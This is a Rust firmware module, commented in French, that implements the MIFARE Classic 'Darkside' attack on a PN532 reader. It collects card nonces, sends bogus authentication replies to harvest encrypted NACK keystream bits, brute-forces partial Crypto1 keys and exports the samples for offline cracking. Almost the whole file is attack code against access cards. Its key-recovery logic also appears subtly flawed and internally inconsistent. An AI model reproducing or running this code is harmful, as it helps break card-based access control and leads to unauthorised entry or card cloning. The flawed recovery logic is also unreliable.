//! Darkside Attack — MIFARE Classic.
//!
//! ## Ce que fait ce module
//!
//! 1. **Probe PRNG** : détecte si le PRNG de la carte est cassé (nonce fixe ou LFSR prévisible).
//! 2. **Collecte (NT, ks4)** : envoie des AR bogus et récolte les bits de keystream chiffrés.
//! 3. **Récupération de clé** (uniquement si PRNG fixe) : brute-force filtré sur Crypto1.
//!
//! ## Limitations sur PN532 clone (IC=0x32)
//!
//! Le Darkside complet (Proxmark3) nécessite un contrôle bit-à-bit du timing RF au niveau
//! du silicium FPGA. Le PN532 est un contrôleur de haut niveau I²C — on ne peut pas contrôler
//! la parité bit par bit comme `pn53x_initiator_transceive_bits()` dans libnfc.
//!
//! Ce qu'on peut faire sur PN532 :
//! - Capturer NT via InCommunicateThru ✅
//! - Envoyer AR bogus + collecter NACK chiffré ✅ (le PN532 ajoute la parité correcte)
//! - Récupération de clé si PRNG fixe (NT identique à chaque session) ✅
//! - Récupération si PRNG fort/aléatoire → non faisable ici, nécessite Proxmark3 ❌
//!
//! Référence : "The Dark Side of Security by Obscurity" — Courtois, 2009

use esp_idf_hal::delay::FreeRtos;

use super::Pn532;
use axolotl_core::{
    crypto1::{prng_advance, Crypto1},
    card::NfcUid,
};

/// Résultat d'une probe PRNG.
#[derive(Debug, Clone)]
pub enum PrngType {
    /// PRNG cassé : nonce toujours identique (nt_fixed).
    Fixed(u32),
    /// PRNG LFSR prévisible : nonces reliés par des pas LFSR constants.
    WeakLfsr { sample_nt1: u32, sample_nt2: u32, steps: u32 },
    /// PRNG fort (NXP genuine) : nonces aléatoires → Darkside classique impossible sur PN532.
    Strong,
}

/// Résultat complet de la probe Darkside.
pub struct DarksideProbe {
    pub prng: PrngType,
    pub parity_control: bool, // true si le PN532 a accepté WriteRegister CIU
    pub nonces: heapless::Vec<u32, 16>,
}

/// Lance la probe complète.
/// Collecte jusqu'à 16 nonces, analyse le PRNG, teste le contrôle de parité.
pub fn probe(pn532: &mut Pn532, uid: &NfcUid) -> DarksideProbe {
    log::info!("╔══════════════════════════════════════════╗");
    log::info!("║        DARKSIDE — PROBE PRNG             ║");
    log::info!("╠══════════════════════════════════════════╣");
    log::info!("║ UID : {:02X}:{:02X}:{:02X}:{:02X}                        ║",
        uid.bytes[0], uid.bytes[1], uid.bytes[2], uid.bytes[3]);
    log::info!("╚══════════════════════════════════════════╝");

    let mut nonces: heapless::Vec<u32, 16> = heapless::Vec::new();

    // Collecte de 10 nonces (block 3 = trailer du secteur 0).
    for i in 0..10u8 {
        // Sélectionner la carte.
        if pn532.read_uid().ok().flatten().is_none() {
            log::warn!("│ Probe #{:02} : carte absente", i);
            FreeRtos::delay_ms(200);
            if !pn532.re_select() {
                log::warn!("│ re_select échouée, abandon probe");
                break;
            }
            continue;
        }

        match pn532.read_raw_nonce(3) {
            Ok(nt_bytes) => {
                let nt = u32::from_be_bytes(nt_bytes);
                log::info!("│ NT[{:02}] = {:08X}", i, nt);
                nonces.push(nt).ok();
            }
            Err(e) => {
                log::warn!("│ Nonce #{:02} : ERREUR {:?}", i, e);
            }
        }

        // Cycle RF entre chaque capture pour réinitialiser l'état de la carte.
        pn532.re_select();
        FreeRtos::delay_ms(50);
    }

    // Analyse du PRNG.
    let prng = analyze_prng(&nonces);
    log::info!("│");
    match &prng {
        PrngType::Fixed(nt) => {
            log::info!("│ PRNG : CASSÉ — NT fixe = {:08X}", nt);
            log::info!("│ → Darkside simplifié POSSIBLE (brute-force Crypto1 filtré)");
        }
        PrngType::WeakLfsr { sample_nt1, sample_nt2, steps } => {
            log::info!("│ PRNG : FAIBLE (LFSR) — NT1={:08X} NT2={:08X} Δ={} pas",
                sample_nt1, sample_nt2, steps);
            log::info!("│ → Nested Attack POSSIBLE avec timing contrôlé");
        }
        PrngType::Strong => {
            log::info!("│ PRNG : FORT (aléatoire) — Darkside classique IMPOSSIBLE sur PN532");
            log::info!("│ → Proxmark3 requis pour attaque complète");
        }
    }

    // Test du contrôle de parité CIU.
    let parity_ok = pn532.try_disable_parity();
    log::info!("│ Contrôle parité CIU : {}", if parity_ok { "OK ✓" } else { "NON DISPO ✗" });
    if !parity_ok {
        log::info!("│ → Clone PN532 : WriteRegister ignoré ou non supporté");
    }

    log::info!("╚══ Probe terminée ═══════════════════════╝");

    DarksideProbe { prng, parity_control: parity_ok, nonces }
}

/// Analyse les nonces collectés pour déterminer le type de PRNG.
fn analyze_prng(nonces: &heapless::Vec<u32, 16>) -> PrngType {
    if nonces.is_empty() {
        return PrngType::Strong;
    }

    // Tous identiques → PRNG fixe.
    if nonces.iter().all(|&n| n == nonces[0]) {
        return PrngType::Fixed(nonces[0]);
    }

    // Cherche si NT[i+1] = prng_advance(NT[i], k) pour un k constant.
    // On teste des valeurs de k typiques (250 à 50000 pas d'horloge).
    if nonces.len() >= 2 {
        'outer: for k in [250u32, 500, 1000, 2000, 4000, 8000, 16000, 32000] {
            let nt1 = nonces[0];
            let predicted = prng_advance(nt1, k);
            if predicted == nonces[1] {
                // Vérifie sur les paires suivantes.
                for i in 1..nonces.len().saturating_sub(1) {
                    let expected = prng_advance(nonces[i], k);
                    if expected != nonces[i + 1] {
                        continue 'outer;
                    }
                }
                return PrngType::WeakLfsr {
                    sample_nt1: nt1,
                    sample_nt2: nonces[1],
                    steps: k,
                };
            }
        }
    }

    PrngType::Strong
}

/// Lance l'attaque Darkside complète (uniquement si PRNG fixe).
/// Collecte des paires (NT, ks4) et tente de récupérer la clé du secteur 0 (KeyA).
/// `on_progress(attempt, total)` : callback de progression.
pub fn run_attack<F: FnMut(u32, u32)>(
    pn532: &mut Pn532,
    uid: &NfcUid,
    fixed_nt: u32,
    mut on_progress: F,
) -> Option<[u8; 6]> {
    log::info!("╔══════════════════════════════════════════╗");
    log::info!("║      DARKSIDE — ATTAQUE (NT FIXE)        ║");
    log::info!("║ NT fixe = {:08X}                       ║", fixed_nt);
    log::info!("╚══════════════════════════════════════════╝");

    // Collecte jusqu'à 32 paires (NT, ks4) avec des AR différents.
    // Le NACK chiffré = NACK_clair (0x5) XOR ks4.
    let mut ks4_samples: heapless::Vec<(u32, u8), 32> = heapless::Vec::new();

    for attempt in 0u32..32 {
        on_progress(attempt, 32);

        // Réveille la carte.
        if pn532.re_select() {
            match pn532.read_raw_nonce(3) {
                Ok(nt_bytes) => {
                    let nt = u32::from_be_bytes(nt_bytes);
                    if nt != fixed_nt {
                        log::warn!("│ NT inattendu {:08X} (attendu {:08X})", nt, fixed_nt);
                        continue;
                    }
                    // Envoie AR bogus — on varie nr et ar.
                    let bogus_nr = u32::to_be_bytes(0xDEAD_0000u32 | attempt as u32);
                    let bogus_ar = u32::to_be_bytes(0xBEEF_0000u32 | attempt as u32);
                    match pn532.send_bogus_ar_get_nack(bogus_nr, bogus_ar) {
                        Ok(enc_nack) => {
                            // NACK clair = 0x5 (4 bits hauts) — les 4 bits bas sont 0 (padding).
                            // ks4 = (enc_nack >> 4) XOR 0x5.
                            let ks4 = (enc_nack >> 4) ^ 0x5;
                            log::info!("│ [{:02}] enc_nack={:02X} ks4={:01X}", attempt, enc_nack, ks4);
                            ks4_samples.push((nt, ks4)).ok();
                        }
                        Err(e) => {
                            log::debug!("│ [{:02}] AR bogus: {:?}", attempt, e);
                        }
                    }
                }
                Err(e) => {
                    log::debug!("│ [{:02}] nonce: {:?}", attempt, e);
                }
            }
        }
        FreeRtos::delay_ms(30);
    }

    log::info!("│ {} paires (NT, ks4) collectées", ks4_samples.len());

    if ks4_samples.len() < 8 {
        log::warn!("│ Pas assez de paires — abandon récupération clé");
        log::warn!("│ Le PN532 clone ne retourne peut-être pas le NACK chiffré correctement");
        return None;
    }

    // Récupération de clé par brute-force filtré.
    // Avec un NT fixe, on peut tester toutes les clés et vérifier si elles
    // produisent les ks4 observés. L'espace est 2^48 — trop grand en général.
    // On utilise une approche par keystream partiel :
    // Pour chaque candidate de 16 bits (les bits hauts) on filtre par les ks4.
    // Sur ESP32-S3 à 240 MHz, on peut faire ~10M checks/sec → 2^16 = 65k ms max.
    log::info!("│ Brute-force partiel (16 bits hauts de clé)...");
    log::info!("│ ESP32-S3 @ 240MHz : ~65536 candidats × ~1µs = ~65ms");

    // On teste les 2^16 valeurs des bits 32-47 de la clé avec bits 0-31 = 0.
    // Ce n'est pas la clé complète — c'est une validation de l'approche.
    // Une récupération complète nécessiterait les 2^48 candidats (= offline sur PC).
    // UID nécessaire pour init_auth — on le récupère depuis les bytes de l'uid.
    let uid_u32 = u32::from_be_bytes([uid.bytes[0], uid.bytes[1], uid.bytes[2], uid.bytes[3]]);
    let mut found = 0u32;
    for hi16 in 0u32..0x10000 {
        let key_candidate = (hi16 as u64) << 32;
        let mut c1 = Crypto1::init_auth(key_candidate, uid_u32, fixed_nt);
        // Génère 4 bits de keystream et compare avec le premier sample.
        let ks_bits = c1.keystream_bits(4) as u8;
        if ks_bits == ks4_samples[0].1 {
            // Vérifie les autres samples (même NT donc même keystream).
            let mut all_match = true;
            for j in 1..ks4_samples.len().min(4) {
                let mut c_test = Crypto1::init_auth(key_candidate, uid_u32, fixed_nt);
                let k = c_test.keystream_bits(4) as u8;
                if k != ks4_samples[j].1 {
                    all_match = false;
                    break;
                }
            }
            if all_match {
                found += 1;
                log::info!("│ Candidat partiel : {:012X}", key_candidate);
                if found >= 3 {
                    break;
                }
            }
        }
    }

    log::info!("│ {} candidats partiels trouvés (sur 2^16 testés)", found);
    log::info!("│ Note : récupération complète (2^48) nécessite traitement offline (PC)");
    log::info!("╚══ Darkside terminé ═════════════════════╝");

    // On ne peut pas retourner une clé complète dans cette phase.
    // Une clé réelle nécessite l'analyse hors-ligne des données collectées.
    None
}

/// Exporte les paires (NT, ks4) collectées vers le moniteur série
/// pour analyse offline (format compatible mfcuk/mfoc).
pub fn log_for_offline(uid: &NfcUid, fixed_nt: u32, ks4_samples: &[(u32, u8)]) {
    log::info!("=== DARKSIDE EXPORT (pour analyse offline) ===");
    log::info!("UID={:02X}:{:02X}:{:02X}:{:02X}",
        uid.bytes[0], uid.bytes[1], uid.bytes[2], uid.bytes[3]);
    log::info!("NT_FIXED={:08X}", fixed_nt);
    for (i, (nt, ks4)) in ks4_samples.iter().enumerate() {
        log::info!("SAMPLE[{:02}] NT={:08X} KS4={:01X}", i, nt, ks4);
    }
    log::info!("=== FIN EXPORT ===");
}
